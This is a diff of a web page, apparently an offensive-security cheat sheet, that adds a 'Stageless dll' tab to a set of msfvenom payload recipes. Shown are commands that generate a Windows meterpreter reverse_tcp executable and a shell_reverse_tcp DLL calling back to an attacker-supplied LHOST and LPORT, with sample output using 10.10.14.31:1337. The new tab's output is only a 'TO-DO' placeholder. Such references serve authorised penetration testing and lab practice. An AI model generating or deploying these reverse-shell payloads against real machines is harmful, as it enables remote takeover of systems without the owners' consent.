@@ -181,6 +181,8 @@
 
 <button data-tabset="set1" data-tabcontent="tab3">Staged dll</button>
 
+<button data-tabset="set1" data-tabcontent="tab4">Stageless dll</button>
+
 </p><div class="tabset-wrapper" data-tabset-group="set1"><div class="tabcontent active" data-tabset="set1" data-tabcontent="tab1"><div class="highlight"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">msfvenom -p windows/x64/meterpreter/reverse_tcp -a x64 -f exe --platform windows LHOST=<span class="o editable-keyword">&lt;LOCAL_IP&gt;</span> LPORT=<span class="o editable-keyword">&lt;LOCAL_PORT&gt;</span> &gt; rev.exe
 </span></span></span></code><div class="output-bubble">Sample Output:
 <span class="line"><span class="cl"><span class="gp">$</span> msfvenom -p windows/x64/meterpreter/reverse_tcp -a x64 -f exe --platform windows <span class="nv">LHOST</span><span class="o">=</span>10.10.14.31 <span class="nv">LPORT</span><span class="o">=</span><span class="m">1337</span> &gt; rev.exe
@@ -199,7 +201,11 @@
 </span></span><span class="line"><span class="cl"><span class="go">No encoder specified, outputting raw payload
 </span></span></span><span class="line"><span class="cl"><span class="go">Payload size: 510 bytes
 </span></span></span><span class="line"><span class="cl"><span class="go">Final size of dll file: 9216 bytes
-</span></span></span></div></pre></div></div></div>
+</span></span></span></div></pre></div></div><div class="tabcontent" data-tabset="set1" data-tabcontent="tab4"><div class="highlight"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">msfvenom -p windows/x64/shell_reverse_tcp -a x64 -f dll --platform windows LHOST=<span class="o editable-keyword">&lt;LOCAL_IP&gt;</span> LPORT=<span class="o editable-keyword">&lt;LOCAL_PORT&gt;</span> &gt; rev.dll
+</span></span></span></code><div class="output-bubble">Sample Output:
+TO-DO</div></pre></div></div></div>
+
+
 
 
 
